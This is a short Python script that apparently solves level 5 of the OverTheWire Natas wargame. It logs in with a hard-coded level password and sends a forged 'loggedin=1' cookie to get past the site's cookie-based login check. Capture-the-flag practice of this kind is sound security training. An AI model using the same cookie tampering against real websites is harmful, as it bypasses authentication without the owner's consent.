#!/usr/bin/env python

import requests

username = "natas5"
password = "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"

cookies= {"loggedin" : "1"}

url = 'http://'+username+'.natas.labs.overthewire.org'
session =  requests.Session()
response = session.get(url, auth = (username, password),cookies = cookies)
content = response.text

print(session.cookies['loggedin'])
print(content)